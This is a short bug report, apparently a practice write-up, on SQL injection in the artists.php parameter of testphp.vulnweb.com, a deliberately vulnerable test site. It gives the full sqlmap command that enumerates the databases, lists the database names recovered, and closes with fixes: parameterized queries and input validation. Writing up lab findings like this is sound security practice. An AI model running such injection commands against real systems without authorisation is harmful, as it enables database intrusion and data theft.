
# Bug Report: SQL Injection on testphp.vulnweb.com

**Target:** http://testphp.vulnweb.com  
**Bug Type:** SQL Injection  
**Tool Used:** sqlmap  
**Severity:** High  
**Status:** Confirmed Vulnerable

---

## 🧪 Steps to Reproduce:

1. URL:

http://testphp.vulnweb.com/artists.php?artist=1

2. Run sqlmap:

sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch --dbs

3. Result:  
sqlmap successfully extracted database names:
- acuart
- information_schema

---

## 🔍 Evidence:

- SQLmap output confirming vulnerability
- Dumped database names shown in CLI

---

## 🔐 Recommendation:

Use parameterized queries or prepared statements  
Apply WAF and input validation

---

✅ Reported by: **Cyber Jatti (Alishba)**  
🕵️‍♀️ Tool: sqlmap


---
